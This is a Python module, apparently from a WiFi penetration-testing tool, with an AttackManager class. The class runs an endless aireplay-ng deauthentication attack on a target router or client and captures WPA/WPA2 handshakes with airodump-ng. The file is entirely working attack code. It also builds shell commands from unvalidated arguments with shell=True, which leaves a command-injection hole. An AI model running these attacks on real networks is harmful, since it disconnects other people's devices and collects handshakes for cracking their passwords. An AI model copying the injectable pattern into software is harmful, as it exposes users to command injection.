"""Attack operations for WiFi penetration testing."""

import subprocess
import logging
import threading
from typing import Optional, Callable

logger = logging.getLogger(__name__)


class AttackManager:
    """Manages attack operations."""

    def __init__(self):
        """Initialize attack manager."""
        self.attack_process: Optional[subprocess.Popen] = None
        self.is_running = False

    def start_deauth_attack(
        self,
        iface: str,
        target_bssid: str,
        client_mac: Optional[str] = None,
        callback: Optional[Callable] = None
    ) -> bool:
        """Start deauthentication attack.
        
        Args:
            iface: Interface name
            target_bssid: Target router BSSID
            client_mac: Specific client MAC (optional)
            callback: Status callback function
            
        Returns:
            True if attack started successfully
        """
        try:
            if not self._validate_mac(target_bssid):
                logger.error("Invalid target BSSID")
                return False
            
            logger.info(f"Starting deauth attack on {target_bssid}")
            
            if client_mac:
                cmd = f"sudo aireplay-ng --deauth 0 -a {target_bssid} -c {client_mac} {iface}"
            else:
                cmd = f"sudo aireplay-ng --deauth 0 -a {target_bssid} {iface}"
            
            self.attack_process = subprocess.Popen(
                cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            self.is_running = True
            
            if callback:
                callback("Deauth attack started")
            
            logger.info("Deauth attack initiated")
            return True
        except Exception as e:
            logger.error(f"Error starting deauth attack: {e}")
            return False

    def start_handshake_capture(
        self,
        iface: str,
        target_bssid: str,
        output_file: str = "capture",
        callback: Optional[Callable] = None
    ) -> bool:
        """Start WPA/WPA2 handshake capture.
        
        Args:
            iface: Interface name
            target_bssid: Target router BSSID
            output_file: Output file for capture
            callback: Status callback function
            
        Returns:
            True if capture started successfully
        """
        try:
            if not self._validate_mac(target_bssid):
                logger.error("Invalid target BSSID")
                return False
            
            logger.info(f"Starting handshake capture on {target_bssid}")
            
            cmd = f"sudo airodump-ng {iface} -b {target_bssid} -w {output_file} --output-format cap"
            
            self.attack_process = subprocess.Popen(
                cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            self.is_running = True
            
            if callback:
                callback("Handshake capture started")
            
            logger.info("Handshake capture initiated")
            return True
        except Exception as e:
            logger.error(f"Error starting handshake capture: {e}")
            return False

    def stop_attack(self, callback: Optional[Callable] = None) -> bool:
        """Stop current attack.
        
        Args:
            callback: Status callback function
            
        Returns:
            True if attack stopped successfully
        """
        try:
            if self.attack_process:
                self.attack_process.terminate()
                self.attack_process.wait(timeout=5)
                self.is_running = False
                
                if callback:
                    callback("Attack stopped")
                
                logger.info("Attack stopped")
                return True
            return False
        except subprocess.TimeoutExpired:
            self.attack_process.kill()
            self.is_running = False
            logger.warning("Attack process force killed")
            return False
        except Exception as e:
            logger.error(f"Error stopping attack: {e}")
            return False

    @staticmethod
    def _validate_mac(mac: str) -> bool:
        """Validate MAC address format.
        
        Args:
            mac: MAC address to validate
            
        Returns:
            True if valid
        """
        import re
        pattern = r"([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})"
        return bool(re.match(pattern, mac))
